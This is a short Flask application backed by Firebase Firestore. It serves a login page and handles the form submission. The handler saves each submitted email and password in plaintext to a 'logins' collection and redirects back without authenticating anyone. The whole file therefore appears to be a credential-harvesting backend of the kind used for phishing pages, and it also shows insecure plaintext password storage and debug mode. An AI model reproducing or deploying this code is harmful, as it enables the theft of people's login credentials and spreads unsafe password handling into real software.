import os
from flask import Flask, render_template, request, redirect, url_for
import firebase_admin
from firebase_admin import credentials, firestore

# Initialize Flask app
app = Flask(__name__)

# Use environment variable to load Firebase service account credentials
cred_path = os.getenv('GOOGLE_APPLICATION_CREDENTIALS')

if cred_path:
    cred = credentials.Certificate(cred_path)
    firebase_admin.initialize_app(cred)
    # Initialize Firestore
    db = firestore.client()
else:
    print("Firebase credentials not found.")

# Route for the login page
@app.route('/')
def login():
    return render_template('index.html')

# Route to handle login form submission
@app.route('/login', methods=['POST'])
def login_post():
    email = request.form['email']
    password = request.form['password']

    # Save login data to Firestore
    db.collection('logins').add({
        'email': email,
        'password': password
    })

    # Redirect back to the login page after form submission
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug=True)
